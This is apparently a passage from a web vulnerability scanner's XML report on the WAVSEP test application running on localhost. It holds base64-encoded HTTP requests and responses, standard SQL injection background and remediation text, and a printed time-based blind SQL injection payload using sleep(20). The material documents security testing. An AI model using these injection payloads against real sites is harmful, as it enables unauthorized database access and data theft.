      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA5LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlUHJpdmlsZWdlc09uRGF0YWJhc2UtVW5pb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtVW5pb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1Nzo0NiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA5LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlUHJpdmlsZWdlc09uRGF0YWJhc2UtVW5pb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULVVuaW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDkgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IFJldHJpZXZlIHByaXZpbGVnZXMgb24gYSBkYXRhYmFzZS48L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpNc2dJZAo8L0I+CjwvVEQ+CjxURD4KPEI+ClRpdGxlCjwvQj4KPC9URD4KPFREPgo8Qj4KTWVzc2FnZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA5LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlUHJpdmlsZWdlc09uRGF0YWJhc2UtVW5pb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU4OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDkgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IFJldHJpZXZlIHByaXZpbGVnZXMgb24gYSBkYXRhYmFzZS48L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpNc2dJZAo8L0I+CjwvVEQ+CjxURD4KPEI+ClRpdGxlCjwvQj4KPC9URD4KPFREPgo8Qj4KTWVzc2FnZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3281334322710235136</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-Blind/Case01-ConditionalResponses-RetrieveAdminPassword-BlindExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-Blind/Case01-ConditionalResponses-RetrieveAdminPassword-BlindExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDEtQ29uZGl0aW9uYWxSZXNwb25zZXMtUmV0cmlldmVBZG1pblBhc3N3b3JkLUJsaW5kRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDEtQ29uZGl0aW9uYWxSZXNwb25zZXMtUmV0cmlldmVBZG1pblBhc3N3b3JkLUJsaW5kRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMzo0MSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDEtQ29uZGl0aW9uYWxSZXNwb25zZXMtUmV0cmlldmVBZG1pblBhc3N3b3JkLUJsaW5kRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDEtQ29uZGl0aW9uYWxSZXNwb25zZXMtUmV0cmlldmVBZG1pblBhc3N3b3JkLUJsaW5kRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjQxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0MTENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHRvIHRyaWdnZXIgY2hhbmdlcyBpbiByZXNwb25zZXMgdG8gaW5mZXIgaW5mb3JtYXRpb24uIEdvYWw6IHJldHJpZXZlICdhZG1pbicgcGFzc3dvcmQgaW5qZWN0aW5nIGluIEdFVCBwYXJhbWV0ZXIuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDEtQ29uZGl0aW9uYWxSZXNwb25zZXMtUmV0cmlldmVBZG1pblBhc3N3b3JkLUJsaW5kRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDEtQ29uZGl0aW9uYWxSZXNwb25zZXMtUmV0cmlldmVBZG1pblBhc3N3b3JkLUJsaW5kRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg